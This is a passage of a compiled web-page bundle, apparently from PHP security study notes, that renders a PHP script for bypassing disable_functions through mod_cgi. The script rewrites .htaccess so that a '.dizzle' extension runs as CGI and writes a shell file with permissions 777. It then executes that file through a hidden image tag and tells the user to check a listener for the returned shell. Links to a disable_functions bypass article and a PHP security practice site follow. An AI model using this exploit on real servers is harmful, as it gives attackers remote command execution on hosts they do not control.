variable"}},[s._v("$no")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//this surely can be shorter")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$text")])]),s._v(': "')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$condition")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$yes")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$no")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br>\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("isset")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'checked'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    @"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_put_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'.htaccess'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"\\nSetEnv HTACCESS on"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("FILE_APPEND")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//Append it to a .htaccess file to see whether .htaccess is allowed")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("header")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'Location: '")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_SERVER")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'PHP_SELF'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'?checked=true'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//execute the script again to see if the htaccess test worked")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$modcgi")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("in_array")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'mod_cgi'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("apache_get_modules")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// mod_cgi enabled?")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$writable")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("is_writable")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'.'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//current dir writable?")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$htaccess")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("empty")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_SERVER")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'HTACCESS'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//htaccess enabled?")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Mod-Cgi enabled"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$modcgi")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Yes"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"No"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Is writable"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$writable")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Yes"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"No"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"htaccess working"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$htaccess")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Yes"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"No"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$modcgi")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$writable")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$htaccess")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Error. All of the above must be true for the script to work!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//abort if not")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Backing up .htaccess"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("copy")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('".htaccess"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('".htaccess.bak"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Suceeded! Saved in .htaccess.bak"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Failed!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//make a backup, cause you never know.")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Write .htaccess file"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_put_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'.htaccess'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Options +ExecCGI\\nAddHandler cgi-script .dizzle"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Succeeded!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Failed!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//.dizzle is a nice extension")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Write shell file"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_put_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'shell.dizzle'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$shellfile")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Succeeded!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Failed!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//write the file")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Chmod 777"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"shell.dizzle"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0777")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Succeeded!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Failed!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//rwx")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v("\"Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>\"")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//call the script")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br")])]),a("h3",{attrs:{id:"通过antsword看绕过disable-functions"}},[a("a",{attrs:{href:"https://www.anquanke.com/post/id/195686#h3-3",target:"_blank",rel:"noopener noreferrer"}},[s._v("通过Antsword看绕过disable_functions"),a("OutboundLink")],1),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#通过antsword看绕过disable-functions"}},[s._v("#")])]),s._v(" "),a("h1",{attrs:{id:"php安全练习网站"}},[s._v("PHP安全练习网站 "),a("a",{staticClass:"header-anchor",attrs:{href:"#php安全练习网站"}},[s._v("#")])]),s._v(" "),a("p",[s._v("https://www.ripstech.com/php-security-calendar-2017/")])])}),[],!1,null,null,null);t.default=e.exports}}]);